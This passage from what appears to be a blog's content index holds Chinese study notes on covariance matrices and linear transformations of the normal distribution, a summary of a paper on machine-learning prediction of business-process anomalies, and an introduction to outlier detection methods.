\boldsymbol{x}\right)$$<br>再令 $\boldsymbol{x}=(y, z)^{T}$ ，包含两个随机变量 $y$ 和 $z$ ，则协方差矩阵可写成如下形式： $$ \Sigma=\left[\begin{array}{ll}\sigma(y, y) &amp; \sigma(y, z) \ \sigma(z, y) &amp; \sigma(z, z)\end{array}\right] \in \mathbb{R}^{2 \times 2} $$<br>用<font color="#006EFF">单位矩阵</font>(identity matrix) $I$ 作为<font color="#183D66">协方差矩阵</font>，随机变量 $y$ 和 $z$ 的方差均为1，则生成如干个随机数如图所示。 </p><p><img src="http://files.shanqianche.cn/2021526/1622038800402.png" alt="图1二元正态分布"></p><blockquote><p><font color="#DE8937">知识补充：</font>单位矩阵<br> 单位矩阵是个方阵，从左上角到右下角的对角线（称为主对角线）上的元素均为1。除此以外全都为0。<strong>任何矩阵与单位矩阵相乘都等于本身</strong><br><img src="http://files.shanqianche.cn/2021526/1622039427482.png" alt="单位矩阵"></p></blockquote><p>在生成的若干个随机数中，每个点的似然为 $$ \mathcal{L}(\boldsymbol{x}) \propto \exp \left(-\frac{1}{2} \boldsymbol{x}^{T} \boldsymbol{x}\right) $$</p><blockquote><p><font color="">知识补充：</font>线性变换<br><a href="https://www.bilibili.com/video/av6043439">视频教学</a><br>线性性质一：直线在变换后仍然保持为直线，不能弯曲；线性性质二：原点是固定不变的</p></blockquote><p>对图[二元正态分布]中的所有点考虑一个线性变换(linear transformation)：$\boldsymbol{t}=A \boldsymbol{x}$  ，我们能够得到图</p><p><img src="http://files.shanqianche.cn/2021526/1622039676816.png" alt="图2 经过线性变换的二元正态分布，先将图1的纵坐标压缩0.5倍，再将所有点逆时针旋转30°得到"></p><p>在线性变换中，矩阵 $A$ 被称为<strong>变换矩阵</strong>(transformation matrix)，为了将图1中的点经过线性变换得到我们想要的图2，其实我们需要构造两个矩阵：</p><ul><li><strong>尺度矩阵</strong>(scaling matrix)： $$S=\left[\begin{array}{cc}s_{y}&amp;0\0&amp;s_{z}\end{array}\right]$$</li><li><strong>旋转矩阵</strong>(rotation matrix)： $$R=\left[\begin{array}{cc}\cos(\theta)&amp;-\sin(\theta)\\sin(\theta)&amp;\cos(\theta)\end{array}\right]$$<br>其中， $\theta$ 为顺时针旋转的度数。</li></ul><blockquote><p><font color="#8591A6">补充知识：</font>变换矩阵、尺度矩阵和旋转矩阵三者的关系式<br>$A=R S$</p></blockquote><p>在这个例子中，尺度矩阵为 $S=\left[\begin{array}{l l}1&amp;0\0&amp;\frac{1}{2}\end{array}\right]$ ，旋转矩阵为 $R=\left[\begin{array}{c c}\cos\left(-\frac{\pi}{6}\right)&amp;-\sin\left(-\frac{\pi}{6}\right)\\sin\left(-\frac{\pi}{6}\right)&amp;\cos\left(-\frac{\pi}{6}\right)\end{array}\right]=\left[\begin{array}{c c}\frac{\sqrt{3}}{2}&amp;\frac{1}{2}\-\frac{1}{2}&amp;\frac{\sqrt{3}}{2}\end{array}\right]$ ，故变换矩阵为 $A=R S=\left[\begin{array}{cc}\frac{\sqrt{3}}{2}&amp;\frac{1}{4}\-\frac{1}{2}&amp;\frac{\sqrt{3}}{4}\end{array}\right]$</p><p>另外，需要考虑的是，经过了线性变换，$t$  的分布是什么样子呢？</p><p>将 $\boldsymbol{x}=A^{-1} \boldsymbol{t}$ 带入前面给出的似然 $\mathcal{L}(\boldsymbol{x})$ ，有 $\mathcal{L}(\boldsymbol{t}) \propto \exp \left(-\frac{1}{2}\left(A^{-1} \boldsymbol{t}\right)^{T}\left(A^{-1} \boldsymbol{t}\right)\right)$<br>$=\exp \left(-\frac{1}{2} \boldsymbol{t}^{T}\left(A A^{T}\right)^{-1} \boldsymbol{t}\right)$</p><p>由此可以得到，多元正态分布的协方差矩阵为 $$\Sigma=A A^{T}=\left[\begin{array}{cc}\frac{\sqrt{3}}{2} &amp; \frac{1}{4} \ -\frac{1}{2} &amp; \frac{\sqrt{3}}{4}\end{array}\right]\left[\begin{array}{cc}\frac{\sqrt{3}}{2} &amp; -\frac{1}{2} \ \frac{1}{4} &amp; \frac{\sqrt{3}}{4}\end{array}\right]=\left[\begin{array}{cc}\frac{13}{16} &amp; -\frac{3 \sqrt{3}}{16} \ -\frac{3 \sqrt{3}}{16} &amp; \frac{7}{16}\end{array}\right]$$</p><h2 id="协方差矩阵的特征值分解"><a href="#协方差矩阵的特征值分解" class="headerlink" title="协方差矩阵的特征值分解"></a>协方差矩阵的特征值分解</h2><blockquote><p>回到我们已经学过的线性代数内容，对于任意对称矩阵 $\Sigma$ ，存在一个特征值分解(eigenvalue decomposition, EVD)： $$\Sigma=U \Lambda U^{T}$$ 其中, $U$ 的每一列都是相互正交的特征向量，且是单位向量，满足 $U^{T}U=I$ ， $\Lambda$ 对角线上的元素是从大到小排列的特征值，非对角线上的元素均为0。</p></blockquote><p>当然，这条公式在这里也可以很容易地写成如下形式： $$\Sigma=\left(U \Lambda^{1 / 2}\right)\left(U \Lambda^{1 / 2}\right)^{T}=A A^{T}$$<br>其中，$A=U \Lambda^{1 / 2}$  ，因此，通俗地说，<font color="#226771">任意一个协方差矩阵都可以视为线性变换的结果。</font><br>在上面的例子中，<strong>特征向量构成的矩阵</strong>为 $$U=R=\left[\begin{array}{cc}\cos (\theta) &amp; -\sin (\theta) \ \sin (\theta) &amp; \cos (\theta)\end{array}\right]=\left[\begin{array}{cc}\frac{\sqrt{3}}{2} &amp; \frac{1}{2} \ -\frac{1}{2} &amp; \frac{\sqrt{3}}{2}\end{array}\right]$$<br><strong>特征值构成的矩阵</strong>为<br>$$\Lambda=S S^{T}=\left[\begin{array}{cc}s_{y}^{2} &amp; 0 \ 0 &amp; s_{z}^{2}\end{array}\right]=\left[\begin{array}{ll}1 &amp; 0 \ 0 &amp; \frac{1}{4}\end{array}\right]$$<br>到这里，我们发现：多元正态分布的概率密度是由<font color="#BD5A5D">协方差矩阵的特征向量控制旋转(rotation)</font>，<font color="">特征值控制尺度(scale)</font>，除了协方差矩阵，<font color="#810006">均值向量会控制概率密度的位置</font>，在图1和图2中，均值向量为 $0$ ，因此，概率密度的中心位于坐标原点。</p>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>挖掘业务流程，结合机器学习进行业务预测分析</title>
      <link href="/2021/05/25/%E6%8C%96%E6%8E%98%E4%B8%9A%E5%8A%A1%E6%B5%81%E7%A8%8B%EF%BC%8C%E7%BB%93%E5%90%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%BF%9B%E8%A1%8C%E4%B8%9A%E5%8A%A1%E9%A2%84%E6%B5%8B%E5%88%86%E6%9E%90/"/>
      <url>/2021/05/25/%E6%8C%96%E6%8E%98%E4%B8%9A%E5%8A%A1%E6%B5%81%E7%A8%8B%EF%BC%8C%E7%BB%93%E5%90%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%BF%9B%E8%A1%8C%E4%B8%9A%E5%8A%A1%E9%A2%84%E6%B5%8B%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="基于机器学习的流程异常预测行为"><a href="#基于机器学习的流程异常预测行为" class="headerlink" title="基于机器学习的流程异常预测行为"></a>基于机器学习的流程异常预测行为</h2><p><img src="./attachments/%E5%9F%BA%E4%BA%8E%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%B5%81%E7%A8%8B%E5%BC%82%E5%B8%B8%E9%A2%84%E6%B5%8B%E6%96%B9%E6%B3%95_%E9%AD%8F%E6%87%BF.pdf" alt="基于机器学习的流程异常预测方法_魏懿"></p><h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h3><blockquote><p>通过挖掘流程执行的<font color="#D2691E">日志记录</font> 和<font color="#6495ED">活动执行时间信息 </font>，基于机器学习方法的异常检测方法，实现实时预测业务流程中的超 期 异 常 和 流 程 行 为 异 常。</p></blockquote><h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><blockquote><p>异常(预期的，完全意外的)</p></blockquote><ol><li>流程超期、资源不可用、活动执行失败等和完全意外的异常</li></ol><blockquote><p>现有的流程异常检测方法</p></blockquote><ul><li>主动 的 设 置 时 间 检 查点、动态检查，或 被动地基于异常发生后捕捉异常、处理异常的机制<ol><li>主动设置时间检查点的方法有两个弊端，第一个设置点的位置无法精确判断，第二个是系统状态是动态的，受生产环境等诸多条件影响，所以主动i设置会造成很多新的问题</li><li>被动处理超期异常的方法，失去了对业务流程管理的主动性，从而将导致工作流期望的目标延迟或付出更大的开销。【即失去对于流程预测的主动性】</li></ol></li></ul><h3 id="目前国内外研究动态"><a href="#目前国内外研究动态" class="headerlink" title="目前国内外研究动态"></a>目前国内外研究动态</h3><h4 id="基于时间边界的时间异常检测"><a href="#基于时间边界的时间异常检测" class="headerlink" title="基于时间边界的时间异常检测"></a>基于时间边界的时间异常检测</h4><ol><li>基于时间边界的时间异常检测–Eder</li></ol><p><font size=1>the fifth and sixth document of this paper </font></p><pre><code>首先要明确每个任务节点执行时间的上下边界， 基于这两个时限， 计算起始节点到当前节点的最佳（ 最短） 执行时间和最坏（ 最长） 执行时间。当流程执行时， 如果当前时间在区间内， 则判断为没有时间异常</code></pre><ol start="2"><li>基于关键路径</li></ol><p><font size=1>the seventh document of this paper </font></p><pre><code>在工作流执行前，会根据模型先找出关键路径， 并在流程执行时检查最佳完成时间与最终时限， 如果最佳完成时间大于最终时限， 则预测为异常</code></pre><h4 id="时间统计模型建立"><a href="#时间统计模型建立" class="headerlink" title="时间统计模型建立"></a>时间统计模型建立</h4><ol><li>执行时间建模方法</li></ol><p><font size=1>the eighth document of this paper </font></p><pre><code>该方法利用历史日志生成涵盖所有活动持续时间直方图来表示当前节点和末端节点之间的剩余执行时间的概率，用于捕获有关工作流执行的时间信息，定义计算工作流执行时间的必要操作</code></pre><ol start="2"><li>综合时间模型和流程步骤分析</li></ol><p><font size=1>the ninth document of this paper </font></p><pre><code>综合运用时间统计模型和通过多个步骤分析方法生成运行时间概率分布、计算异常概率、与阈值比较的方法，提出一种基于运行的异常预测算法来预测工作流中的时间异常，该算法分为即设计时段和运行时段两个阶段，在设计时段，生成该模型所有可能产生的运行轨迹，并计算它们的预计执行时间的概率分布；在运行时段，通过分析计算流程超时的可能性与预设的阈值做比较来判断是否预测为异常    </code></pre><ol start="3"><li>结合积极语义模型</li></ol><p><font size=1>the tenth document of this paper </font></p><pre><code>采用积极语义模型来捕捉各种工作流情形下的 语 义 特 征，并 且 检 测 和 处 理 异 常    </code></pre><ol start="4"><li>提出受启发与传染病模型的时间延迟传播模型</li></ol><p><font size=1>the eleventh document of this paper </font></p><pre><code>着眼于并行云工作流中的时间延迟，提出受启发与传染病模型的时间延迟传播模型，预测使云工作流中达到一定完成率的最大时间异常数目</code></pre><h3 id="离群点检测的算法"><a href="#离群点检测的算法" class="headerlink" title="离群点检测的算法"></a>离群点检测的算法</h3><p><a href="https://blog.zuishuailcq.xyz/2021/05/25/%E7%A6%BB%E7%BE%A4%E7%82%B9%E6%A3%80%E6%B5%8B/">离群点检测 | 吾辈之人，自当自强不息！</a></p><p><a href="https://blog.zuishuailcq.xyz/2021/05/31/%E5%AD%A4%E7%AB%8B%E6%A3%AE%E6%9E%97%EF%BC%88Isolation%20Forest%EF%BC%89/">孤立森林（Isolation Forest） | 吾辈之人，自当自强不息！</a></p><h2 id="本文"><a href="#本文" class="headerlink" title="本文"></a>本文</h2><h3 id="idea"><a href="#idea" class="headerlink" title="idea"></a>idea</h3><blockquote><p>提出一种基于活动执行时间和比例关系的方法，通过学习历史流程执行日志中活动时间信息，根据正在执行的待预测流程的日志及状态，预测其是否为异常流程以及异常的类型。并且，本文提出通过计算活动执行时间之间的比例关系作为流程特征加入机器学习算法，运用机器学习中监督学习的分类器以预测流程是否会发生超期异常（流程执行总时间超过预设最终期限），同时使用非监督学习的离群点检测算法根据历史数据中活动执行时间比例关系判定流程行为异常。结合两种算法的结果对流程异常预测做出进一步的分类和分析。</p></blockquote><h3 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h3><ol><li>预处理历史和正在执行的流程数据，获得流程中活动执行时间序列以及计算活动执行时间<font color="#8B0000">比例关系</font></li><li>使用监督学习的分类器，预测并标记超期【流程执行<br>总时间超过预设最终期限】异常流程为<math xmlns="http://www.w3.org/1998/Math/MathML"><mi mathvariant="normal">I</mi></math>类异常流程</li><li> 用无监督学习检测离群点算法【 <font color="#9400D3">活动执行时间之间比例关系(单个活动占总体)</font>为特征值】，找出历史数据中的异常流程并标记为<math xmlns="http://www.w3.org/1998/Math/MathML"><mi mathvariant="normal">I</mi></math><math xmlns="http://www.w3.org/1998/Math/MathML"><mi mathvariant="normal">I</mi></math>类异常流程</li><li> 通过集成业务流程异常预测方法将待预测流程分为正常流程或者不同种类的异常流程</li></ol><h3 id="结构概述"><a href="#结构概述" class="headerlink" title="结构概述"></a>结构概述</h3><p><img src="http://files.shanqianche.cn/2021531/1622429405396.png" alt="集成业务流程异常预测方法结构图"></p><blockquote><p><font color="#8FBC8F">知识补充：</font>弱监督<br>不完全监督（Incomplete supervision）：训练数据中只有一部分数据被给了标签，有一些数据是没有标签的。<br>不确切监督（Inexact supervision）：训练数据只给出了粗粒度标签。可理解为只给了大类的标签，详细属性没有给标签<br>不精确监督（Inaccurate supervision）：给出的标签不总是正确的</p></blockquote><p><img src="http://files.shanqianche.cn/2021531/1622441386940.png" alt="预测结果异常分类韦恩图"></p><ol><li>第一类通过弱监督学习方法可以标记出大部分的异常流程，但是系统的运行情况很容易受环境资源影响，很多时候由于等待时间过长，被误标为异常流程，但是依旧属于正常流程</li><li>在实际业务流程中， 活动的执行时间之间并非独立分布， 而是具有隐含的相关关系， 由于多种因素的影响， 造成了活动时间相应的变化。比如工作负荷加倍使得某些活动花费了较长时间， 导致流程总时间较长， 有超期异常的风险。但是从活动执行时间比例关系来看， 流程时间可能被近乎等比例放大， 完全是合情合理的， 并不应该被记为最终期限异常的流程。在活动时间比例上， 正常执行的流程活动时间比例关系是相似的， 而行为异常的流程活动时间比例关系容易出现离群点。因此计算流程中活动时间的比例关系， 并将其作为特征加入算法是有必要的。</li></ol><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><h4 id="数据源"><a href="#数据源" class="headerlink" title="数据源"></a>数据源</h4><blockquote><p><font color="#1E90FF">数据集</font><br>将历史业务流程日志及正在执行流程中的活动执行时间信息作为初始的数据集</p></blockquote><p><font color="#7FFF00">TODO</font><br> 通过目前较为成熟的流程挖掘算法和软件， 如ProM Tools、Disco， 流程模型模拟业务流程获取数据可以简化结构、 缩减活动数量。</p><p><font color="#ff7500">数据初始化：</font><br>待预测流程的活动数量：n<br>多条与待预测执行流程路径一致的历史流程数量：q<br>待预测流程执行时间集：T<br>其中一条流程的活动执行时间序列：<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>T</mi><mi>k</mi></msub><mo>(</mo><mi>k</mi><mo>&#x2208;</mo><mo>[</mo><mn>1</mn><mo>,</mo><mi>q</mi><mo>]</mo><mo>)</mo></math><br>序列中单个活动的执行时间：<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>t</mi><mi>i</mi></msub><mo>(</mo><mi>i</mi><mo>&#x2208;</mo><mo>[</mo><mn>1</mn><mo>,</mo><mi>n</mi><mo>]</mo><mo>)</mo></math></p><p>待预测流程执行时间集：<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>T</mi><mo>=</mo><mfenced close="]" open="["><mrow><msub><mi>T</mi><mn>1</mn></msub><mo>,</mo><msub><mi>T</mi><mn>2</mn></msub><mo>,</mo><mo>&#x22EF;</mo><mo>,</mo><msub><mi>T</mi><mi>k</mi></msub><mo>,</mo><mo>&#x22EF;</mo><mo>,</mo><msub><mi>T</mi><mi>q</mi></msub></mrow></mfenced><mo>,</mo><mi>k</mi><mo>&#x2208;</mo><mo>[</mo><mn>1</mn><mo>,</mo><mi>q</mi><mo>]</mo></math><br>序列k的流程时间：<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>T</mi><mi>k</mi></msub><mo>=</mo><mfenced close="]" open="["><mrow><msub><mi>t</mi><mn>1</mn></msub><mo>,</mo><msub><mi>t</mi><mn>2</mn></msub><mo>,</mo><mo>&#x22EF;</mo><mo>,</mo><msub><mi>t</mi><mi>i</mi></msub><mo>,</mo><mo>&#x22EF;</mo><mo>,</mo><msub><mi>t</mi><mi>n</mi></msub></mrow></mfenced><mo>,</mo><mi>i</mi><mo>&#x2208;</mo><mo>[</mo><mn>1</mn><mo>,</mo><mi>n</mi><mo>]</mo></math></p><h4 id="获得时间比例"><a href="#获得时间比例" class="headerlink" title="获得时间比例"></a>获得时间比例</h4><p><font color="#1E90FF">对长度为 $n$ 的活动执行时间序列<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>T</mi><mi>k</mi></msub></math>，求出长度为 $n-1$ 的时间比例序<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>R</mi><mi>k</mi></msub></math>，记比例数据集为 $R$ </font></p><p><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>R</mi><mo>=</mo><mfenced close="]" open="["><mrow><msub><mi>R</mi><mn>1</mn></msub><mo>,</mo><msub><mi>R</mi><mn>2</mn></msub><mo>,</mo><mo>&#x22EF;</mo><mo>,</mo><msub><mi>R</mi><mi>k</mi></msub><mo>,</mo><mo>&#x22EF;</mo><mo>,</mo><msub><mi>R</mi><mi>q</mi></msub></mrow></mfenced><mo>,</mo><mi>k</mi><mo>&#x2208;</mo><mo>[</mo><mn>1</mn><mo>,</mo><mi>q</mi><mo>]</mo></math><br><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>R</mi><mi>k</mi></msub><mo>=</mo><mfenced close="]" open="["><mrow><mfrac><msub><mi>t</mi><mn>1</mn></msub><msub><mi>t</mi><mn>2</mn></msub></mfrac><mo>,</mo><mfrac><msub><mi>t</mi><mn>2</mn></msub><msub><mi>t</mi><mn>3</mn></msub></mfrac><mo>,</mo><mo>&#x22EF;</mo><mo>,</mo><mfrac><msub><mi>t</mi><mi>i</mi></msub><msub><mi>t</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub></mfrac><mo>,</mo><mo>&#x22EF;</mo><mo>,</mo><mfrac><msub><mi>t</mi><mrow><mi>n</mi><mo>-</mo><mn>1</mn></mrow></msub><msub><mi>t</mi><mi>n</mi></msub></mfrac></mrow></mfenced><mo>,</mo><mi>i</mi><mo>&#x2208;</mo><mo>[</mo><mn>1</mn><mo>,</mo><mi>n</mi><mo>-</mo><mn>1</mn><mo>]</mo></math></p><h4 id="对异常流程进行标记"><a href="#对异常流程进行标记" class="headerlink" title="对异常流程进行标记"></a>对异常流程进行标记</h4><ul><li>通过历史流程计算出流程执行时间分布，可以给不同活动设定阈值，来标记超期异常流程</li><li>可以用执行时间拟合建立高斯分布，利用模型参数设立阈值以标记异常（如临界点 $threshold$ <math xmlns="http://www.w3.org/1998/Math/MathML"><mo>=</mo><mi>&#x3BC;</mi><mo>+</mo><mn>2</mn><mo>&#xB7;</mo><mi>&#x3C3;</mi></math>），标记出的异常数据集为<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>t</mi><mi>c</mi><mi>v</mi></math>【time constrain violation 违规时间约束】</li></ul><h4 id="集成业务流程异常预测方法（EnsBPAP）"><a href="#集成业务流程异常预测方法（EnsBPAP）" class="headerlink" title="集成业务流程异常预测方法（EnsBPAP）"></a>集成业务流程异常预测方法（EnsBPAP）</h4><blockquote><p><font color="#9932CC">前提</font><br>将待预测流程的活动执行时间序列记为ｔ，将其时间比例序列记为ｒ， 同数据预处理中得到的历史流程的执行时间,比例数据集和标记出的异常数据集 $T$ , $R$ , $tcv$</p></blockquote><ol><li>将活动执行时间和比例的训练数据集和测试用例数据传入监督学习的分类算法中， 得到超期异常预测结果</li><li>将活动时间比例的训练集和测试用例传入无监督学习异常检测算法， 得到行为异常预测结果</li><li>用两个预测结果访问EnsBPAP分类结果矩阵， 并返回最终的分类结果</li></ol><p><font color="#0000FF">EnsBPAP(t,r,T,R,balance_data)伪代码</font></p><p><img src="http://files.shanqianche.cn/2021531/1622448127881.png" alt="输入输出"></p><p><img src="http://files.shanqianche.cn/2021531/1622448326369.png" alt="步骤函数"></p><ol><li>标记超期异常流程</li><li>标记行为异常【时间比例异常】</li><li>制定EnsBPAP模型【位运算】</li><li>将异常流程通过EnsBPAP模型，获得符合模型的综合分类结果</li></ol><blockquote><p>class： 预测测试过程的综合分类结果</p></blockquote><h4 id="超期异常预测"><a href="#超期异常预测" class="headerlink" title="超期异常预测"></a>超期异常预测</h4><p><font color="#7FFF00">分类器基本模型</font></p><ul><li>逻辑回归算法–监督学习</li></ul><p><font color="#DC143C">数据存在问题</font></p><ul><li>异常点在整个数据集中的数量远小于正常点的数量【样本不均衡问题】，会导致分类器倾向于把预测样本分为多数类。</li></ul><p><font color="#00FFFF">处理样本不平衡问题</font>—<a href="https://blog.zuishuailcq.xyz/2021/05/31/%E4%BA%8C%E5%88%86%E7%B1%BB%E4%B9%8B%E7%B1%BB%E5%88%AB%E4%B8%8D%E5%B9%B3%E8%A1%A1/">二分类之类别不平衡 | 吾辈之人，自当自强不息！</a></p><ul><li>使用过采样和欠采样结合的方法<font color="#0000FF">SMOTE + TOMEK algorithm</font></li></ul><ol><li>第１步， 将执行时间和比例数据Ｔ，Ｒ 合并成训练集Ｘ， 训练目标为tcv，ｔ，ｒ合并成测试样本ｘ； </li><li>第２步， 根据balance_data参数选择是否执行SMOTE＋Tomek算法均衡训练样本【balance_data平衡训练数据以进行时间约束违规预测】</li><li>第3步，对每个特征做归一化消除数据量级的影响【<font color="#FF00FF">归一化的目的就是使得预处理的数据被限定在一定的范围内（比如[0,1]或者[-1,1]），从而消除奇异样本数据导致的不良影响</font>。】</li><li>第4步，初始化算法模型，超参数空间，最佳参数</li><li>第5步，通过若干次迭代随机生成超参数、参考交叉验证法评估当前超参数下的性能、更新最佳超参</li><li>最后一步，使用最佳超参数拟合算法模型，预测测试样本模型类型，并返回</li></ol><p><img src="http://files.shanqianche.cn/2021611/1623397346285.png" alt="TimeConstraitsViolationPrediction(t,r,T,R,tcv,balance_data)"></p><h4 id="行为异常检测"><a href="#行为异常检测" class="headerlink" title="行为异常检测"></a>行为异常检测</h4><p><font color="#8B0000">目标</font></p><ul><li>通过活动执行时间比例找出离群点， 以鉴别待预测流程是否为行为异常的流程。</li></ul><p><font color="#8B008B">算法模型</font></p><ul><li>孤立森林</li></ul><ol><li>第１步， 初始化算法模型</li><li>第２步， 拟合历史数据得到孤立森林模型</li><li>第３步， 预测测试样本并返回</li></ol><p><img src="http://files.shanqianche.cn/2021611/1623397471182.png" alt="BehaviorAnimalyDetection(r,R)"></p><blockquote><p><font color="#006400">补充知识</font><br><a href="https://blog.csdn.net/huangfei711/article/details/78456165">如何通俗易懂地理解皮尔逊相关系数？_黄飞的博客专栏-CSDN博客_皮尔逊相关系数怎么看</a></p></blockquote><h2 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h2><ol><li>流程的预设期限<font color="#5F9EA0">如何</font> <font color="#696969">在哪</font> 还有 <font color="#BDB76B">设置的标准</font>没有提到</li></ol>]]></content>
      
      
      <categories>
          
          <category> paper </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> RPA </tag>
            
            <tag> algorithm </tag>
            
            <tag> paper </tag>
            
            <tag> machine learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>离群点检测</title>
      <link href="/2021/05/25/%E7%A6%BB%E7%BE%A4%E7%82%B9%E6%A3%80%E6%B5%8B/"/>
      <url>/2021/05/25/%E7%A6%BB%E7%BE%A4%E7%82%B9%E6%A3%80%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><h3 id="基本定义"><a href="#基本定义" class="headerlink" title="基本定义"></a>基本定义</h3><p><strong>离群点检测</strong>（<font color=" #009688">异常检测</font>）是找出其行为不同于预期对象的过程，这种对象称为离群点或异常。</p><blockquote><p>离群点和噪声有区别，噪声是观测变量的随机误差和方差，而离群点的产生机制和其他数据的产生机制就有根本的区别,同一批数据产生方式可能不一样。</p></blockquote><p><strong>全局离群点</strong>：通过找到某种合适的偏离度量方式，将离群点检测划为不同的类别；全局离群点是情景离群点的特例，因为考虑整个数据集为一个情境。</p><p><strong>情境离群点</strong>：又称为条件离群点，即在特定条件下它可能是离群点，但是在其他条件下可能又是合理的点。比如夏天的28℃和冬天的28℃等。</p><p><strong>集体离群点</strong>：个体数据可能不是离群点，但是这些对象作为整体显著偏移整个数据集就成为了集体离群点。</p><p><img src="http://files.shanqianche.cn/2021525/1621947763766.png" alt="黑色对象形成集体离群点"></p><h3 id="补充学习"><a href="#补充学习" class="headerlink" title="补充学习"></a>补充学习</h3><blockquote><p>有些模型的表现一直不错，建议优先考虑。对于大数据量和高纬度的数据集，Isolation Forest算法的表现比较好。小数据集上，简单算法KNN和MCD的表现不错。</p></blockquote><p> <font color="#F6C75A">聚类：</font>将物理或抽象对象的集合分成由类似的对象组成的多个类的过程被称为聚类。</p><p><font color="#D87E8D">簇：</font>把数据划分为不同类别，机器学习给这个类别定义一个新的名字—簇。</p><h2 id="离群点检测目前遇到的挑战"><a href="#离群点检测目前遇到的挑战" class="headerlink" title="离群点检测目前遇到的挑战"></a>离群点检测目前遇到的挑战</h2><ul><li>正常数据和离群点的有效建模本身就是个挑战,数据没有标签，无法分清正常数据还是异常数据；或者缺乏异常数据；</li><li>离群点检测高度依赖于应用类型使得不可能开发出通用的离群点检测方法，比如针对性的相似性、距离度量机制等；</li><li>数据质量实际上往往很差，噪声充斥在数据中，影响离群点和正常点之间的差别，缺失的数据也可能“掩盖”住离群点，影响检测到有效性；</li><li>检测离群点的方法需要可解释性；</li></ul><h2 id="离群点检测方法"><a href="#离群点检测方法" class="headerlink" title="离群点检测方法"></a>离群点检测方法</h2><h3 id="监督方法"><a href="#监督方法" class="headerlink" title="监督方法"></a>监督方法</h3><p> <strong>➀训练可识别离群点的分类器</strong></p><p><font color="#009688">困难：</font> 1 .两个类别（正常和离群）的数据量很不平衡，缺乏足够的离群点样本可能会限制所构建分类器的能力；<br>2. 许多应用中，捕获尽可能多的离群点（灵敏度和召回率）比把正常对象误当做离群点更重要。</p><blockquote><p>由于与其他样本相比离群点很稀少，所以离群点检测的监督方法必须注意如何训练和如何解释分类率。</p></blockquote><p><strong>➁One-class model，一分类模型</strong></p><pre><code>考虑到数据集严重不平衡的问题，构建一个仅描述正常类的分类器，不属于正常类的任何样本都被视为离群点。比如SVM决策边界以外的都可以视为离群点。</code></pre><h3 id="无监督方法"><a href="#无监督方法" class="headerlink" title="无监督方法"></a>无监督方法</h3><blockquote><p>正常对象在某种程度上是“聚类”的，正常对象之间具有高度的相似性，但是离群点将远离正常对象的组群。<font color="#72A1C3">但是遇到前文所述的集体离群点时，正常数据是发散的，而离群点反而是聚类的</font>,这种情形下更适合<font color="#A98A2F">监督方法</font>进行检测。无监督方法很容易误标记离群点导致许多真实的离群点逃脱检测。</p></blockquote><p><strong>对于传统的聚类方法，有以下几个问题：</strong></p><ul><li>不属于任何簇的对象可能是噪声，而不是离群点；</li><li>先找出簇再找出离群点的开销很大（离群点数量远少于正常对象）；</li></ul><h3 id="半监督方法"><a href="#半监督方法" class="headerlink" title="半监督方法"></a>半监督方法</h3><p>当有一些被标记的正常对象时，可以先使用它们，与邻近的无标记对象一起训练一个正常的对象模型，使用这个模型检测离群点；但是由于具有标记的数据只有少部分，意味着仅仅基于少量被标记的离群点而构建的离群点模型不大可能是有效的。</p><h3 id="统计方法"><a href="#统计方法" class="headerlink" title="统计方法"></a>统计方法</h3><blockquote><p>假定正常的数据对象由一个统计模型产生，不遵守该模型的数据是离群点。即正常对象出现在该随机模型的高概率区域中，而低概率区域中的对象是离群点</p></blockquote><h4 id="参数方法—壹"><a href="#参数方法—壹" class="headerlink" title="参数方法—壹"></a>参数方法—壹</h4><blockquote><p>基于正态分布的一元离群点检测（仅涉及一个属性或变量的数据）</p></blockquote><ol><li>假定数据由某个正态分布产生，由输入来学习正态分布的参数（μ ，σ）（最大似然估计），通过假设检验的方法，一般认定如果某点距离估计的分布均值超过3σ  ，就被认为是离群点。下面的文章中提到过利用盒图和四分位数据来划分离群点，其原理类似。</li><li>另一种离群点检测方法是Grubb检验（最大标准残差检验），对于数据集中的每个对象x，定义z分数(z-score)为：$z=\frac{|x-\bar{x}|}{s}$ , $\bar{x}$是输入数据的均值，s是标准差。<br>若 $z\geq\frac{N-1}{\sqrt{n}}\sqrt{\frac{t_{a/(2N),N-2}^{2}}{N-2+t_{a/(2N),N-2}^{2}}}$ ,x视为离群点。<br>其中 $t^{2}\alpha/(2N),N-2$ 是显著水平 $\alpha /(2N)$ 下的 $t-$ 分布的值，N是数据集中的对象数。</li></ol><h4 id="参数方法—贰"><a href="#参数方法—贰" class="headerlink" title="参数方法—贰"></a>参数方法—贰</h4><blockquote><p>多元离群点检测<br><font size=1>涉及两个或多个属性或变量的数据称为多元数据。核心思想是把多元离群点检测任务转换成一元离群点检测问题。</font></p></blockquote><ol><li><font color="#032953"><strong>马哈拉诺比斯距离检测多元离群点</strong></font></li></ol><p> 对一个多元数据集，设 $\bar{o}$ 为均值向量，对数据集中的对象 $O$ ，从  $O$ 到 $\bar{o}$ 